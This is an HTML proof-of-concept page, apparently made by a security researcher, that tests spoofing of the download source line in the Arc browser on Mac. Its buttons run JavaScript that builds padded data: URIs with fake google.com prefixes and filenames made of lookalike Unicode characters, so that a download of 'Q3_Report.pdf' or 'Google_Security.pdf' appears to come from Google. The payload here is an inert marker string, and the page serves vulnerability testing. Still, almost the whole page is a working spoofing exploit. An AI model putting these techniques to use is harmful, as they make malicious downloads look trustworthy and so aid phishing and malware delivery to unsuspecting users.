<!doctype html>
<html lang="en">
<head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Arc Mac — download source-line spoof</title>
<style>
body{font-family:-apple-system,system-ui,sans-serif;padding:22px;line-height:1.55;max-width:820px}
button{display:block;width:100%;text-align:left;background:#d92d20;color:#fff;border:0;border-radius:8px;
padding:11px 14px;font-size:14px;font-weight:600;margin:7px 0;cursor:pointer}
button.b{background:#0b62d6}
code{background:#eee;padding:1px 5px;border-radius:4px;font-size:12px}small{color:#666}
</style></head>
<body>
<h2>Arc Mac — spoof the real <code>From</code> line</h2>
<p>Target: make the source line read <b>google.com</b> instead of <code>ajaone.github.io</code>.</p>

<button onclick="v(1)">1 · data: + host + spaces + mime  ★</button>
<button onclick="v(2)">2 · data: + host, no padding</button>
<button onclick="v(3)">3 · data://google.com/ (double slash form)</button>
<button onclick="v(4)">4 · data: + full path (accounts.google.com/signin/verify)</button>
<button onclick="v(5)">5 · data: + host + newline chars before mime</button>
<button onclick="v(6)">6 · data: host spoof + leading-origin filename (double)</button>
<button class="b" onclick="v(7)">7 · control: normal blob (shows the real origin)</button>

<p><small>Body of every file = <b>pwned by 33x</b>. Check BOTH surfaces: the download popup right after saving, and Arc's full downloads panel.</small></p>

<script>
var C=String.fromCharCode, CO=C(0x2236), SL=C(0x29F8);
var B64=btoa('pwned by 33x');
var PAD=new Array(240).join(' ');
var MIME='application/octet-stream';

function go(uri,name){
  var a=document.createElement('a');
  a.href=uri; a.download=name;
  document.body.appendChild(a); a.click(); document.body.removeChild(a);
}
function v(n){
  if(n===1) go('data:https://google.com/'+PAD+MIME+';base64,'+B64,'Q3_Report.pdf');
  if(n===2) go('data:https://google.com/'+MIME+';base64,'+B64,'Q3_Report.pdf');
  if(n===3) go('data://google.com/'+PAD+MIME+';base64,'+B64,'Q3_Report.pdf');
  if(n===4) go('data:https://accounts.google.com/signin/verify?ok=1'+PAD+MIME+';base64,'+B64,'Google_Security.pdf');
  if(n===5) go('data:https://google.com/%0A%0D'+PAD+MIME+';base64,'+B64,'Q3_Report.pdf');
  if(n===6) go('data:https://google.com/'+PAD+MIME+';base64,'+B64,
               'https'+CO+SL+SL+'google.com'+SL+'download'+SL+'  Q3_Financial_Report_2026.pdf');
  if(n===7){ var b=new Blob(['pwned by 33x']); go(URL.createObjectURL(b),'control.pdf'); }
}
</script>
</body></html>
